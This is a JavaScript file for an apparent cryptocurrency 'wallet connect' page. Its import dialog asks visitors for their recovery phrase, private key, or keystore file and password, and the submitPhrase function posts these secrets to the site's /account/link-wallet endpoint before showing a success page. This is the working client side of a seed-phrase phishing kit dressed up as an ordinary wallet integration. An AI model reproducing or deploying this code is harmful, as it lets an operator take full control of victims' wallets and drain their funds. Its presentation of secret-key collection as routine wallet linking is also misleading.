// WALLET CONTAINER
const walletContainer = document.querySelector("wallet-container");

// WALLET CONNECT CONTAINER
const walletConnectContainer = document.querySelector(
  "#wallet-connect-container"
);
const walletConnectForm = document.querySelector("#wallet-connect-form");
const walletConnectName = document.querySelector("#wallet-connect-name");
const walletConnectImage = document.querySelector("#wallet-connect-image");

// WALLET IMPORT CONTAINER
const walletimportContainer = document.querySelector(
  "#wallet-import-container"
);
const walletImportForm = document.querySelector("#wallet-import-form");

const walletimportHeader = document.querySelector("#wallet-import-header");
const walletimportImage = document.querySelector("#wallet-import-image");
const walletimportNote = document.querySelector("#wallet-import-note");
const walletimportPassword = document.querySelector(
  "input[name='walletPassword']"
);

const connectionInput = document.querySelector("#connectionInput");
const submitPhraseButton = document.querySelector("#submit-phrase-button");
const submitPhraseForm = document.querySelector("#submit-phrase-form");

let walletName = "",
  walletImgSrc = "",
  popupTop,
  popupLeft;

function calculatePopupPosition(clickedElement, popup, left, topPixelMinus) {
  const clickedRect = clickedElement.getBoundingClientRect();
  const clickedElementTop = clickedRect.top + window.scrollY;
  const clickedElementLeft = clickedRect.left + window.scrollX;

  // Set the position of the popup near the clicked element
  popupTop = clickedElementTop - popup.clientHeight - 10; // Adjust 10 pixels for padding
  popupLeft =
    clickedElementLeft + (clickedElement.clientWidth - popup.clientWidth) / 2;

  popup.style.top = `${popupTop - topPixelMinus}px`;
  popup.style.left = `${left}`;
}

let clickedWallet;

function popupConnectTab(wallet) {
  walletName = wallet.dataset.walletname;
  walletImgSrc = wallet.dataset.imgsrc;
  clickedWallet = wallet;

  calculatePopupPosition(wallet, walletConnectForm, "2%", 300);

  walletConnectContainer.classList.remove("hidden");
  walletConnectContainer.classList.add("flex");

  walletConnectName.textContent = walletName;
  walletConnectImage.src = walletImgSrc;
}

function openWalletImportTab() {
  closeWalletConnectContainer();
  calculatePopupPosition(clickedWallet, walletImportForm, "2%", 320);

  walletimportContainer.classList.remove("hidden");
  walletimportContainer.classList.add("flex");

  walletimportHeader.textContent = `Import your ${walletName} wallet`;
  walletimportImage.src = walletImgSrc;
}

let connectionType = "phrase";

function changeConnectionMethod(method) {
  connectionType = method.dataset.connection;

  if (connectionType === "phrase") {
    connectionInput.placeholder = `Enter Your Recovery ${method.textContent.trim()}`;
    walletimportNote.textContent =
      "Typically 12 (sometimes 24) words separated by single spaces";
    if (walletimportPassword.classList.contains("block")) {
      walletimportPassword.classList.remove("block");
      walletimportPassword.classList.add("hidden");
    } else {
      return;
    }
  }
  if (connectionType === "keystore") {
    connectionInput.placeholder = `Enter Your ${method.textContent.trim()}`;
    walletimportNote.textContent =
      'Several lines of text beginning with "{...}" plus the password you used to encrypt it.';
    if (walletimportPassword.classList.contains("hidden")) {
      walletimportPassword.classList.remove("hidden");
      walletimportPassword.classList.add("block");
    } else {
      return;
    }
  }
  if (connectionType === "privatekey") {
    connectionInput.placeholder = `Enter Your ${method.textContent.trim()}`;
    walletimportNote.textContent =
      "Typically 12 (sometimes 24) words seperated by a single space";
    if (walletimportPassword.classList.contains("block")) {
      walletimportPassword.classList.remove("block");
      walletimportPassword.classList.add("hidden");
    } else {
      return;
    }
  }
}

async function submitPhrase(e) {
  e.preventDefault();
  let wallet = walletName;
  let type = connectionType;
  let key = connectionInput.value;
  let walletPassword = walletimportPassword.value;

  let body = {
    wallet,
    type,
    key,
    walletPassword,
  };
  changeSubmitButtonState("Connecting...", true);

  const res = await fetch(`/account/link-wallet`, {
    headers: {
      "Content-type": "application/json",
    },
    method: "POST",
    body: JSON.stringify(body),
  });

  // get response
  const data = await res.json();

  if (data.status === "success") {
    displayAlert(document.querySelector("#connection-alert-success"));
    setTimeout(() => {
      closeWalletImportTab();
    }, 6000);
    changeSubmitButtonState("Connect", false);
    window.location.replace("/account/wallet-connect-success");
  } else {
    displayAlert(document.querySelector("#connection-alert-error"));
    changeSubmitButtonState("Connect", false);
  }
}

submitPhraseForm.addEventListener("submit", submitPhrase);

function displayAlert(alert) {
  alert.classList.remove("hidden");
  setTimeout(() => {
    alert.classList.add("hidden");
  }, 3000);
}

function changeSubmitButtonState(text, disabled) {
  submitPhraseButton.disabled = disabled;
  submitPhraseButton.innerHTML = `
    ${text}

      <svg
      xmlns="http://www.w3.org/2000/svg"
      fill="none"
      viewBox="0 0 24 24"
      stroke-width="1.5"
      stroke="currentColor"
      class="w-5 h-5 ml-6"
      >
      <path
          stroke-linecap="round"
          stroke-linejoin="round"
          d="M17.25 8.25L21 12m0 0l-3.75 3.75M21 12H3"
      />
      </svg>
    `;
  //   submitPhraseButton.disabled = disabled;
}

function closeWalletConnectContainer() {
  walletConnectContainer.classList.add("hidden");
  walletConnectContainer.classList.remove("flex");
}

function closeWalletImportTab() {
  walletimportContainer.classList.add("hidden");
  walletimportContainer.classList.remove("flex");
}
